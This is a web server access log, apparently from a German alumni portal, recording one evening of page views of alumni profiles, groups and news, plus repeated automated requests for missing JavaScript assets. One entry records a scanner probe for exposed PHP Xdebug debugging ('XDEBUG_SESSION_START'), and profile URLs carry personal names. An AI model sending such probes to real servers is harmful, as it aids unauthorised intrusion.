user;timestamp;referer;target;method;status
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-08 19:42:49;;/personen/alumni/schule/65262;GET;200
85c13336e27e5559d93aba03fbd8b77240414b041ac275a073b8189c671011a6;2025-11-08 19:48:25;;/personen/alumni/details/heidi-burghard;GET;200
0956dd48d6bfedd11f6d90615baca94a89b4f4c603df739291243b281c80b501;2025-11-08 19:51:05;;/login;GET;200
c4da6907c41db1c4f3bddafca7ab3bafb38aeb73d911969e02d1aedfa8b5bd9b;2025-11-08 19:56:07;;/personen/alumni/details/joel-schlunder;GET;200
63d5b6f319713c9ae1bed418a6b5b5e55122b9c7c706805d49a8198ccf82ecb7;2025-11-08 19:58:09;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-08 19:59:58;;/;GET;200
e7a38aa695847f8d8988f20ecccae129eadf383b2fc59ba89c97dc54f14c0f71;2025-11-08 20:03:03;;/gruppen/hobby/malen-und-zeichnen;GET;302
16edafd16507494a3613ed311721d65aa133eb51ef32fc59ee4274567f94806f;2025-11-08 20:09:48;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
d9935b3e7fd70a2cea19515c08047a37c1d2ed30c2dae4812454cd4a23d2805d;2025-11-08 20:16:52;;/gruppen/hobby/kreatives-schreiben;GET;302
20170fe2a4fb586baecfaad898dd1fa741252163f4d6cc3680520723eb7f3631;2025-11-08 20:20:18;;/.well-known/traffic-advice;GET;404
78cf9459595ce1e793cd747e4bce64690ff263dd500f1741366cf3ea9a2e0bd4;2025-11-08 20:20:18;/;/personen/alumni/schule/SL001;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-08 20:20:19;;/personen/alumni/schule/5508;GET;200
934ab935ee3d4d167874b81c8a4816370a658925946ce4658daf74d34c56f7d9;2025-11-08 20:22:10;/;/personen/alumni/schule/SL001;GET;200
a9fcfbaa2c73d67013b0985b345cb30c19f4dd79d081b93e2ba6cbf75ab2b398;2025-11-08 20:22:22;/;/;GET;200
a9fcfbaa2c73d67013b0985b345cb30c19f4dd79d081b93e2ba6cbf75ab2b398;2025-11-08 20:22:26;/sitemap.xml;/sitemap.xml;GET;200
3e9b162570dbd1865e8889bfae604309b5bb5df14be1f2bd582e43b1ee3eed2e;2025-11-08 20:22:48;/;/personen/alumni/schule/SL001;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-08 20:23:08;/aktuelles/meldungen?category=wissenschaft;/personen/alumni/schule/5820;GET;200
d1a183721693fa16978604f507eaed0a3b7a2fca433b88b1c2aa0c00624b8cf8;2025-11-08 20:23:27;;/personen/alumni/schule/68457;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-08 20:24:31;/gruppen/interesse/it-und-softwareentwicklung;/personen/alumni/details/cynthia-ott;GET;200
f8fe34bf5eb31f0e616e3cf11baf5b0ce203c13c48bacba8997dd78692133dc2;2025-11-08 20:26:42;;/;GET;200
28f9767c7fbaac70e5c933c56917e4fe9bda0dfd24522f87bec8990336546435;2025-11-08 20:30:01;;/personen/alumni/schule/HB0002;GET;200
8f4b0ceb777e412795c057deefb0b17bcda45805cf1ed6f494a1ec2d87583fab;2025-11-08 20:32:20;;/sitemap_index.xml;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:03;;/;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:14;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:16;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:18;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:34:18;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:16;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 20:35:18;;/assets/app/core.js;GET;404
6d3d10d8284674cda95faa90d17f71dc6dbae776ced85eaec1f51590c145b2c9;2025-11-08 20:36:25;;/gruppen/hobby/musikproduktion;GET;302
5b62468f6e45f446a26f8fadc0a84139db07e5d0da8be7a6e87a882cbf822423;2025-11-08 20:43:01;;/personen/alumni/details/jana-zenker;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-08 20:45:35;;/aktuelles/stellenangebote;GET;200
7279043112c60c616787e6b833bd2eeae0bfe0bdb0e4c5b82bdf63bfaca2dd4a;2025-11-08 20:49:18;;/personen/alumni/schule/164045;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-08 20:52:00;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/interesse/strategische-planung;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-08 20:53:24;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/hobby/literaturanalyse;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-08 20:53:25;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen;GET;200
c5c9bc83315ce45d2d8593608461497f05758f4241d1ab5df80701a742e7f5ad;2025-11-08 20:55:59;;/themen?category=community;GET;200
6fecab6c3990452d959277cf4f31b3cd44a2a20e137167baee602bdd30c86dfd;2025-11-08 20:56:25;;/personen;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-08 20:57:49;;/personen/alumni/schule/170574;GET;200
2a123c242c44371930d1c4d8c75b23d6577a7c88c28d2d8d8db3a57b09924826;2025-11-08 21:02:44;;/personen/alumni/schule/MP001;GET;200
d7ac5b670ad00c63d93e51611e7e54c108334ef496f734d64174308d777044af;2025-11-08 21:09:26;;/gruppen/hobby/fotografie;GET;302
9e42528f78e9ea30d04d8e9449ccfa56a2a9294a17599b21b73a66876d116e00;2025-11-08 21:15:57;;/;GET;200
42bf59be803f043d158d1047bec3c1d67130ce03fd8ae56f2bdb03bb3f4337a0;2025-11-08 21:16:16;;/personen/alumni/schule/SHH001;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-08 21:16:24;;/?XDEBUG_SESSION_START=phpstorm;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:17:46;;/;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:02;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:03;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:04;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:54;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:56;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:18:56;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
aac89ae21eb7a5599b6cc1d28354eee4e6784c57598b6ca538436257231993dc;2025-11-08 21:20:21;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
19cb88d92ffad15b0b304ea98e343aa7ecb07042a010dea2873a1be62625d902;2025-11-08 21:22:44;;/gruppen/hobby/abschlussfest;GET;302
110038867812f6387caa15032656657f8cc54aecb8ce0dae3335858dbc431aef;2025-11-08 21:22:57;/themen/details/uni-zwischen-ebbe-und-flut;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
567921b6a77205868bcc52731006a3deb4cf96dc9fef0647284727aca2143f1e;2025-11-08 21:23:40;;/themen/details/was-kommt-nach-dem-abitur;GET;200
ae6517f273a3a02b32d429690251e17ad06ce8ecdc86fb2fedd8da7f0212749c;2025-11-08 21:23:41;;/gruppen/hobby/logikspiele;GET;302
960df9ae92d9e1752dc4de05f161961748c65e2d616365df1ab226afc9ee8e42;2025-11-08 21:23:43;;/gruppen;GET;200
791908475b9ccd3e0c2c69aef35a25a2d96c699c8f27153eaaa1a1a310482481;2025-11-08 21:29:51;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
0ea4c89e30e34c9638ee01314654b8426f3383ea84300cd20f4497c30452db7c;2025-11-08 21:30:03;;/personen/alumni/details/felix-fischer;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:17;;/;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:30;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:31;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:31:31;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:30;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:31;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-08 21:32:34;;/assets/app/form.js;GET;404
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-08 21:35:19;;/personen/alumni/schule/4440541;GET;200
78cc8da92587dca3a4a9cfeacc8fdf97231f2aacba5aaea20d60ef1964a16072;2025-11-08 21:37:07;;/personen/alumni/details/lisa-stache;GET;200
f38a109ae57e12e35321944f0fc0fbfa28762b997d6adc68a3c1f20bc0f26123;2025-11-08 21:37:32;;/personen/all/4;GET;200
a9c89127ad0eccbfa0f95a478478a28184636162f891921621e803bbd799cc31;2025-11-08 21:43:39;;/;GET;200
c0e853b762af4c0a49592967c126b8dbc45113e1c49d1e9140dc26971f0053e5;2025-11-08 21:44:35;;/;GET;200
43f69934495e19cf97535dd5ae26df2935eb81c186b22e3da63973347f8229cb;2025-11-08 21:45:26;;/themen/details/was-kommt-nach-dem-abitur;GET;200
431f4b9aff6218f814d04d9f6d620bc3819d8d483a2c13e3d3faa2f352927362;2025-11-08 21:46:45;;/personen/all/3;GET;200
3ceb9fc891724b8207bb02c98403f90b75c80cde01ebe84a86fe61acd4ce3654;2025-11-08 21:51:54;;/;GET;200
3ceb9fc891724b8207bb02c98403f90b75c80cde01ebe84a86fe61acd4ce3654;2025-11-08 21:52:25;;/sitemap.xml;GET;200
